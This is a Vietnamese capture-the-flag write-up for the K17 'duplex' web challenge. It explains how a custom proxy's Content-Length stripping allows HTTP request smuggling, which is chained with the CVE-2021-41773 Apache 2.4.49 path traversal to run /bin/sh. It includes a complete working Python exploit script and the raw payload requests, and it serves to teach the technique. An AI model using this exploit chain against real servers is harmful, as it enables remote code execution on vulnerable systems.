---
title: "K17 CTF Write-up: duplex"
date: 2026-09-12 
categories: [Write-ups, K17 CTF]
tags: [web, k17]
---

# Duplex — K17 CTF Web Challenge Writeup

> **Giải**: K17 CTF  
> **Thể loại**: Web Exploitation  
> **Độ khó**: Hard  
> **Flag**: `K17{un4_p3t1t10_dupl3x_53n5u5...}`  
> **Kỹ thuật**: HTTP Request Smuggling (CL Stripping) + CVE-2021-41773 (Apache Path Traversal → RCE)

<img width="1637" height="71" alt="Screenshot 2026-09-12 172402" src="https://github.com/user-attachments/assets/56e530bc-9c93-4957-9069-09dff81686a0" />

<img width="1787" height="625" alt="Screenshot 2026-09-12 171458" src="https://github.com/user-attachments/assets/8d72b115-cd42-4798-9d1f-bf85284156c2" />

<img width="961" height="493" alt="Screenshot 2026-09-12 171624" src="https://github.com/user-attachments/assets/4a6fc9c8-9274-4303-923c-6c3cb123314d" />

<img width="1810" height="828" alt="Screenshot 2026-09-12 171640" src="https://github.com/user-attachments/assets/6e84ff3f-6ff9-428c-b21f-92640f9633c7" />

<img width="812" height="55" alt="Screenshot 2026-09-12 171658" src="https://github.com/user-attachments/assets/a112e99d-c12c-4596-baec-6c6038396e05" />

<img width="1042" height="337" alt="Screenshot 2026-09-12 171703" src="https://github.com/user-attachments/assets/4e58ece6-8131-4d07-b5c5-b0f7447e5f0f" />

---

## Mục lục

1. [Tổng quan đề bài](#1-tổng-quan-đề-bài)
2. [Phân tích kiến trúc](#2-phân-tích-kiến-trúc)
3. [Reverse Engineering — Proxy Binary](#3-reverse-engineering--proxy-binary)
4. [Xác định lỗ hổng](#4-xác-định-lỗ-hổng)
5. [Xây dựng Exploit](#5-xây-dựng-exploit)
6. [Thực thi và lấy Flag](#6-thực-thi-và-lấy-flag)
7. [Các hướng sai và bài học](#7-các-hướng-sai-và-bài-học)

---

## 1. Tổng quan đề bài

Đề bài cung cấp một thư mục `duplex/` chứa source code của một web service:

```
duplex/
├── Dockerfile
├── apache/
│   ├── httpd.conf
│   └── htdocs/
│       └── index.html
├── proxy          (ELF 64-bit binary)
└── getflag        (ELF 64-bit binary, suid root)
```

Truy cập trang web, ta thấy một trang HTML đơn giản:

```html
<h1>Duplex</h1>
<p>Pars posterior vivit.</p>
```

<img width="1036" height="312" alt="Screenshot 2026-09-12 171833" src="https://github.com/user-attachments/assets/2293f7af-4432-4ff0-abfb-2d07c8491f96" />

> **"Pars posterior vivit"** là tiếng Latin, nghĩa là **"Phần sau sống sót"** — đây là gợi ý rất lớn cho hướng giải, nhưng lúc đầu mình chưa nhận ra.

**Mục tiêu**: Thực thi binary `/getflag` trên server để lấy flag.

---

## 2. Phân tích kiến trúc

### 2.1. Dockerfile

```dockerfile
FROM httpd:2.4.49

COPY apache/httpd.conf /usr/local/apache2/conf/httpd.conf
COPY apache/htdocs/ /usr/local/apache2/htdocs/

COPY proxy /app/proxy
COPY getflag /getflag

RUN chmod 755 /app/proxy \
    && chown root:root /getflag \
    && chmod 111 /getflag

EXPOSE 8080

CMD ["sh", "-c", "httpd -DFOREGROUND & exec /app/proxy"]
```

**Nhận xét quan trọng:**

| Thành phần | Chi tiết |
|---|---|
| **Apache version** | `2.4.49` — phiên bản dính CVE-2021-41773 (Path Traversal → RCE) |
| **Proxy** | Binary C tự viết, lắng nghe cổng **8080** (cổng mở ra bên ngoài) |
| **Apache** | Lắng nghe cổng **80** (chỉ nội bộ trong container) |
| **getflag** | Quyền `111` (execute-only), owned by `root:root` |

**Kiến trúc:**

```
                 Port 8080            Port 80
Internet ──────► [Proxy] ──────────► [Apache 2.4.49] ──► /getflag
                 (filter)            (vulnerable)
```

### 2.2. Apache Configuration (httpd.conf)

Các cấu hình quan trọng:

```apache
# Root directory - cho phép truy cập TOÀN BỘ filesystem
<Directory />
    AllowOverride none
    Require all granted          # ← NGUY HIỂM: mở toàn bộ
</Directory>

# CGI được bật qua mod_cgid
<IfModule !mpm_prefork_module>
    LoadModule cgid_module modules/mod_cgid.so
</IfModule>

# ScriptAlias cho CGI
ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"

<Directory "/usr/local/apache2/cgi-bin">
    AllowOverride None
    Options None
    Require all granted
</Directory>
```

**Tóm tắt cấu hình nguy hiểm:**

1. `Require all granted` trên `/` — cho phép truy cập mọi file trên filesystem
2. `mod_cgid` được load — có thể thực thi CGI scripts
3. `ScriptAlias /cgi-bin/` — tạo endpoint CGI
4. Apache 2.4.49 — dính CVE-2021-41773

### 2.3. CVE-2021-41773 — Apache Path Traversal

Apache 2.4.49 có lỗ hổng Path Traversal cho phép thoát khỏi DocumentRoot bằng cách encode ký tự `.` thành `%2e`:

```
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
```

Apache sẽ decode `%2e` thành `.`, biến URL thành `/cgi-bin/../../../../etc/passwd`, cho phép đọc file tùy ý. Kết hợp với `ScriptAlias /cgi-bin/` và `mod_cgid`, ta có thể thực thi lệnh:

```
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Length: 48

echo Content-Type: text/plain; echo; /getflag
```

**Tuy nhiên**, có một vấn đề: ta không thể truy cập trực tiếp Apache (cổng 80 chỉ bind nội bộ). Mọi request phải đi qua **Proxy** ở cổng 8080, và proxy sẽ **chặn** các path không hợp lệ.

---

## 3. Reverse Engineering — Proxy Binary

### 3.1. Tổng quan

Binary `proxy` là file ELF 64-bit, non-PIE, stripped. Mình sử dụng `capstone` (Python disassembly framework) để phân tích, kết hợp với phân tích PLT/GOT để xác định các hàm libc được gọi.

### 3.2. Luồng xử lý chính (hàm `0x401d56`)

```
handle_client(client_fd):
    ┌──────────────────────────────────────────────┐
    │ 1. recv() data vào buffer 16KB               │
    │ 2. Tìm \r\n\r\n (end of headers)             │
    │ 3. Parse Content-Length → body_length         │
    │ 4. recv() thêm body nếu cần                  │
    │ 5. sscanf(request_line, "%15s %1023s",        │
    │          method, path)                        │
    │ 6. Kiểm tra path: chỉ cho "/" hoặc "/health"  │
    │    → Nếu không → 403 Forbidden               │
    │ 7. has_body = check_transfer_encoding()       │
    │ 8. rewrite_headers():                         │
    │    - Nếu has_body=1 → STRIP Content-Length    │
    │    - Copy headers + body vào output buffer    │
    │ 9. connect() tới Apache 127.0.0.1:80          │
    │ 10. send() output buffer tới Apache           │
    │ 11. proxy_loop(): Apache → Client (1 chiều)   │
    └──────────────────────────────────────────────┘
```

### 3.3. Hàm `0x401909` — Path Filter (allowlist)

```asm
0x401909: push     rbp
; ...
0x401919: mov      esi, 0x403053       ; "/" 
0x401921: call     0x4010f0            ; strcmp(path, "/")
0x401926: test     eax, eax
0x401928: je       0x40193f            ; if equal → ALLOW

0x40192e: mov      esi, 0x403055       ; "/health"
0x401936: call     0x4010f0            ; strcmp(path, "/health")
0x40193b: test     eax, eax
0x40193d: jne      0x401946            ; if not equal → BLOCK

0x40193f: mov      eax, 1              ; return 1 (ALLOWED)
; ...
0x401946: mov      eax, 0              ; return 0 (BLOCKED)
```

**Kết luận:** Proxy chỉ cho phép **đúng 2 path**: `"/"` và `"/health"`. Mọi path khác bị chặn với response `403 Forbidden`.

### 3.4. Hàm `0x4017c9` — has_body (Check Transfer-Encoding)

Đây là hàm **then chốt** quyết định lỗ hổng. Hàm này **KHÔNG kiểm tra HTTP method** (GET/POST), mà kiểm tra sự tồn tại của header `Transfer-Encoding:`:

```asm
0x4017c9: push     rbp
; ... (khởi tạo vòng lặp duyệt qua từng dòng header)

; Xây dựng chuỗi "Transfer-Encoding:" trên stack
0x40182f: movabs   rax, 0x726566736e617254  ; "Transfer"
0x401839: movabs   rdx, 0x6e69646f636e452d  ; "-Encodin"
0x40184b: mov      word ptr [rbp-0x30], 0x3a67  ; "g:"

; So sánh từng dòng header với "Transfer-Encoding:" (case-insensitive)
0x401881: call     strncasecmp

; Nếu tìm thấy → return 1
0x40188a: mov      eax, 1
0x40188f: jmp      0x4018b0

; Nếu duyệt hết mà không tìm thấy → return 0
0x4018ab: mov      eax, 0
```

**Tóm tắt:** 
- `has_body(headers)` trả về `1` nếu có header `Transfer-Encoding:` (bất kể giá trị)
- Trả về `0` nếu không có

### 3.5. Hàm `0x401a2d` — rewrite_headers

Hàm này xây dựng lại request trước khi forward sang Apache:

```
rewrite_headers(recv_buf, header_len, body_ptr, body_len, out_buf, out_size):
    has_body = check_transfer_encoding(recv_buf, header_len)  // 0x4017c9
    
    for each header_line in recv_buf:
        if has_body == 1 AND header_line starts with "Content-Length:":
            SKIP this line  // ← STRIP Content-Length!
        else:
            COPY header_line to out_buf
    
    APPEND "\r\n" to out_buf     // end of headers
    APPEND body to out_buf       // copy body data
    return total_written
```

**Phát hiện quan trọng:**
- Khi `has_body=1`: `Content-Length` bị **XÓA** khỏi request forward
- `Transfer-Encoding` header **KHÔNG bị xóa** — nó vẫn được forward sang Apache
- Body data vẫn được copy nguyên vẹn vào output

### 3.6. Hàm `0x401c2e` — proxy_loop

```
proxy_loop(backend_fd, client_fd):
    while True:
        select(backend_fd, read_set, timeout=1s)
        if backend_fd readable:
            data = recv(backend_fd)
            send(client_fd, data)
```

**Quan trọng:** Proxy loop chỉ forward dữ liệu **một chiều**: từ Apache → Client. Không có dữ liệu nào được gửi thêm từ Client → Apache trong giai đoạn này. Điều này có nghĩa **HTTP Pipelining không hoạt động** — chỉ request đầu tiên được forward.

---

## 4. Xác định lỗ hổng

### 4.1. Tại sao HTTP Pipelining không hoạt động?

Ý tưởng ban đầu: gửi 2 request trong 1 TCP connection:

```http
GET / HTTP/1.1        ← request 1 (hợp lệ, qua filter)
Host: target

POST /cgi-bin/...     ← request 2 (CVE-2021-41773)
Host: target
Content-Length: 48

echo ...; /getflag
```

**Thất bại** vì proxy chỉ parse và forward request **đầu tiên**. Request thứ hai nằm trong client buffer nhưng không bao giờ được gửi tới Apache (proxy_loop chỉ đọc từ backend, không đọc thêm từ client).

### 4.2. Lỗ hổng thực sự: HTTP Request Smuggling via CL Stripping

Sau khi phân tích sâu binary, mình phát hiện cơ chế **Content-Length Stripping**:

| Bước | Proxy thấy | Apache thấy |
|------|-----------|-------------|
| Headers | `Content-Length: 144`, `Transfer-Encoding: chunked` | `Transfer-Encoding: chunked` (CL đã bị strip!) |
| Body | 144 bytes raw data | Chunked body: `0\r\n\r\n` = empty → done |
| Requests | **1 request** với body 144 bytes | **2 requests**: POST / (empty body) + smuggled POST |

**Cơ chế chi tiết:**

1. Client gửi request với CẢ `Content-Length` VÀ `Transfer-Encoding: chunked`
2. Proxy dùng `Content-Length` để xác định body size → đọc body
3. Hàm `has_body()` phát hiện `Transfer-Encoding:` → return 1
4. Hàm `rewrite_headers()` **XÓA** `Content-Length` nhưng **GIỮ** `Transfer-Encoding: chunked`
5. Forward tới Apache: request + body (nhưng **không có Content-Length**)
6. Apache thấy `Transfer-Encoding: chunked` → parse body theo chunked format
7. Body bắt đầu bằng `0\r\n\r\n` (empty chunked body) → Apache coi request 1 đã hoàn tất
8. Data còn lại (smuggled request) → Apache parse như **request MỚI** (keep-alive HTTP/1.1)
9. Smuggled request khai thác CVE-2021-41773 → RCE → `/getflag` → **FLAG**!

---

## 5. Xây dựng Exploit

### 5.1. Payload Structure

```
┌─────────────── OUTER REQUEST (passes proxy filter) ──────────────┐
│ POST / HTTP/1.1\r\n                                              │
│ Host: target\r\n                                                 │
│ Content-Length: 144\r\n     ← proxy dùng để đọc body             │
│ Transfer-Encoding: chunked\r\n  ← trigger CL stripping          │
│ \r\n                                                             │
│ ┌──────────────── BODY (read by proxy) ────────────────────┐     │
│ │ 0\r\n\r\n                ← chunked terminator cho Apache │     │
│ │ ┌──────── SMUGGLED REQUEST (parsed by Apache) ────────┐  │     │
│ │ │ POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1   │  │     │
│ │ │ Host: target                                         │  │     │
│ │ │ Content-Length: 46                                    │  │     │
│ │ │                                                      │  │     │
│ │ │ echo Content-Type: text/plain; echo; /getflag        │  │     │
│ │ └──────────────────────────────────────────────────────┘  │     │
│ └──────────────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────────────┘
```

### 5.2. Exploit Script (`solve.py`)

```python
import socket
import sys

def exploit(host, port):
    print(f"[*] Targeting {host}:{port}")
    
    # ===== SMUGGLED REQUEST =====
    # CVE-2021-41773: Path traversal qua /cgi-bin/ để thực thi /bin/sh
    command = b"echo Content-Type: text/plain; echo; /getflag\n"
    
    smuggled_req = (
        b"POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: " + str(len(command)).encode() + b"\r\n"
        b"\r\n"
    ) + command
    
    # ===== CHUNKED TERMINATOR =====
    # "0\r\n\r\n" = valid end of chunked transfer (empty body)
    chunked_end = b"0\r\n\r\n"
    
    # Body = chunked_end + smuggled_req
    body = chunked_end + smuggled_req
    
    # ===== OUTER REQUEST =====
    # - Path "/" passes proxy filter
    # - Transfer-Encoding: chunked → triggers CL stripping
    # - Content-Length → tells proxy how many body bytes to read
    outer = (
        b"POST / HTTP/1.1\r\n"
        b"Host: " + host.encode() + b"\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
    ) + body
    
    # Send exploit
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((host, port))
    s.sendall(outer)
    
    # Receive response
    response = b""
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    
    resp_text = response.decode('utf-8', errors='ignore')
    print(resp_text)
    
    if "K17{" in resp_text:
        print("\n[!!!] FLAG FOUND [!!!]")
        for line in resp_text.split('\n'):
            if "K17{" in line:
                print(f"    --> {line.strip()}")
    
    s.close()

if __name__ == "__main__":
    if len(sys.argv) == 3:
        exploit(sys.argv[1], int(sys.argv[2]))
    else:
        print(f"Usage: python3 {sys.argv[0]} <host> <port>")
```

<img width="1917" height="852" alt="Screenshot 2026-09-12 172125" src="https://github.com/user-attachments/assets/a3e88391-a1fd-4d13-8005-dbb3c6c9da1b" />

---

## 6. Thực thi và lấy Flag

```bash
$ python3 solve.py vm1.secso.cc 20548

[*] Targeting vm1.secso.cc:20548
```

**Response nhận được (2 HTTP responses liên tiếp):**

```http
HTTP/1.1 200 OK
Date: Fri, 11 Sep 2026 16:40:03 GMT
Server: Apache/2.4.49 (Unix)
Content-Length: 139
Content-Type: text/html

<!doctype html>
<html>
<head>
    <title>Duplex</title>
</head>
<body>
    <h1>Duplex</h1>
    <p>Pars posterior vivit.</p>
</body>
</html>
```

```http
HTTP/1.1 200 OK
Date: Fri, 11 Sep 2026 16:40:03 GMT
Server: Apache/2.4.49 (Unix)
Transfer-Encoding: chunked
Content-Type: text/plain

22
K17{un4_p3t1t10_dupl3x_53n5u5...}

0
```

<img width="1907" height="687" alt="Screenshot 2026-09-12 172143" src="https://github.com/user-attachments/assets/9f969cbb-8edd-4e64-96d7-d8d5d70fe933" />

> **Flag: `K17{un4_p3t1t10_dupl3x_53n5u5...}`**

**Giải thích response:**
- **Response 1**: Apache xử lý `POST /` → trả về trang index (Duplex) — body rỗng vì chunked terminator `0\r\n\r\n`
- **Response 2**: Apache xử lý smuggled request `POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` → CVE-2021-41773 path traversal → thực thi `/bin/sh` → chạy `/getflag` → trả về **flag**!

---

## 7. Các hướng sai và bài học

### 7.1. HTTP Pipelining (thất bại)

Lần thử đầu tiên, mình cố gửi 2 request riêng biệt (pipelining):

```http
GET / HTTP/1.1
Host: target

POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
...
```

**Kết quả:** Chỉ nhận được response của request 1. Request 2 hoàn toàn bị bỏ qua.

**Lý do:** Proxy chỉ xử lý request ĐẦU TIÊN. Proxy loop (`0x401c2e`) chỉ forward dữ liệu từ Apache → Client, không gửi thêm data từ Client → Apache.

### 7.2. Transfer-Encoding: identity (thất bại — 400 Bad Request)

Mình thử dùng `Transfer-Encoding: identity` (không phải chunked):

**Kết quả:** Apache trả về `400 Bad Request`.

**Lý do:** Apache 2.4.49 không chấp nhận `Transfer-Encoding: identity` — giá trị này đã bị deprecated trong RFC 7230. Apache chỉ chấp nhận `chunked`.

### 7.3. Transfer-Encoding: chunked với body sai format (thất bại — 400 Bad Request)

Mình thử `Transfer-Encoding: chunked` nhưng body bắt đầu trực tiếp bằng smuggled request:

**Kết quả:** Apache trả về `400 Bad Request`.

**Lý do:** Apache nhận `Transfer-Encoding: chunked` và cố parse body theo chunked format. Byte đầu tiên `P` (từ `POST`) không phải hex digit → invalid chunk → 400 error.

### 7.4. Bước đột phá: Chunked Terminator

**Giải pháp:** Thêm `0\r\n\r\n` (5 bytes) vào đầu body. Đây là chunked terminator hợp lệ, báo hiệu "empty chunked body, end of message". Apache parse thành công, sau đó đọc data còn lại như request MỚI.

### 7.5. Bài học rút ra

1. **Đọc kỹ source code/binary** trước khi exploit mù quáng — hiểu rõ cơ chế filter mới tìm được cách bypass
2. **HTTP Request Smuggling** không chỉ là CL-TE hay TE-CL — **CL Stripping** (proxy xóa Content-Length) là một biến thể ít phổ biến nhưng rất nguy hiểm
3. **Chunked encoding format** phải chính xác — body phải bắt đầu bằng valid chunk, không phải raw data
4. **"Pars posterior vivit"** = "Phần sau sống sót" — gợi ý trực tiếp rằng request THỨ HAI (smuggled) mới là cái thực sự được thực thi

---

## Tham khảo

- [CVE-2021-41773 - Apache HTTP Server Path Traversal](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)
- [HTTP Request Smuggling - PortSwigger](https://portswigger.net/web-security/request-smuggling)
- [RFC 7230 - HTTP/1.1 Message Syntax and Routing](https://tools.ietf.org/html/rfc7230)
- [Chunked Transfer Encoding](https://en.wikipedia.org/wiki/Chunked_transfer_encoding)
